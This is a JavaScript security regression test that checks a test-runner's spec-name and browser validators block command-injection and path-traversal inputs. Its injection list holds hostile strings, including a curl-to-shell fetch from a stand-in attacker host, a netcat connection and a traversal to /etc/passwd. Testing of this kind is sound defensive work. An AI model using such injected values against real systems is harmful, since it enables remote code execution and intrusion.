// Security regression test for the qa-robot command-injection fix.
// Run: node scripts/security-test.js
const g = require('../runner-grid.js');

let pass = 0, fail = 0;

function check(label, fn, shouldBlock) {
    let blocked = false, err = '';
    try { fn(); } catch (e) { blocked = true; err = e.message; }
    const ok = blocked === shouldBlock;
    console.log((ok ? '  PASS  ' : '  FAIL  ') + label +
        (blocked ? '  [' + err + ']' : '  [allowed]'));
    ok ? pass++ : fail++;
}

console.log('\n=== spec injection (must BLOCK) ===');
const injections = [
    '; curl attacker.com/x|sh',
    'x.spec.ts; whoami',
    '../../etc/passwd',
    'a.spec.ts && calc',
    '$(id)',
    'a.spec.ts`id`',
    'a.spec.ts | netcat attacker 4444',
    'a.spec.ts\nwhoami',
    '../secrets.spec.ts',
    'a.spec.ts" && whoami',
    "a.spec.ts' && whoami",
    'a.spec.ts&calc',
    '..\\..\\windows\\system32.spec.ts',
    'a.spec.ts%00.jpg'
];
injections.forEach(a => check(JSON.stringify(a), () => g.validateSpec(a), true));

console.log('\n=== spec legit (must ALLOW) ===');
const legit = ['login.spec.ts', 'hospital-e2e.spec.ts', 'a.spec.js',
               'a.test.tsx', 'checkout-flow.spec.mts', 'My_Test-2.spec.ts'];
legit.forEach(a => check(JSON.stringify(a), () => g.validateSpec(a), false));

console.log('\n=== browsers allowlist (must BLOCK) ===');
const badBrowsers = [['chromium; whoami'], ['../../bin'], [42], [null],
                     ['chrome-headless'], ['chromium', 'evil'], {a:1}];
badBrowsers.forEach(b => check(JSON.stringify(b), () => g.validateBrowsers(b), true));

console.log('\n=== browsers legit (must ALLOW) ===');
[['chromium'], ['chromium','firefox','webkit'], ['mobile'], []].forEach(b =>
    check(JSON.stringify(b), () => g.validateBrowsers(b), false));

console.log('\n=== createJob rejects bad input ===');
check('createJob({spec: injection})', () => g.createJob({ spec: 'x.spec.ts; whoami' }), true);
check('createJob({browsers: bad})', () => g.createJob({ browsers: ['evil'] }), true);
check('createJob({spec: valid})', () => g.createJob({ spec: 'login.spec.ts' }), false);

console.log('\n=== createJob sanitises type ===');
const j = g.createJob({ type: 'evil', spec: 'login.spec.ts' });
console.log((j.type === 'e2e' ? '  PASS  ' : '  FAIL  ') + 'type coerced to e2e, got: ' + j.type);
j.type === 'e2e' ? pass++ : fail++;

console.log('\n========================================');
console.log('  PASS: ' + pass + '   FAIL: ' + fail);
console.log('========================================\n');
process.exit(fail > 0 ? 1 : 0);
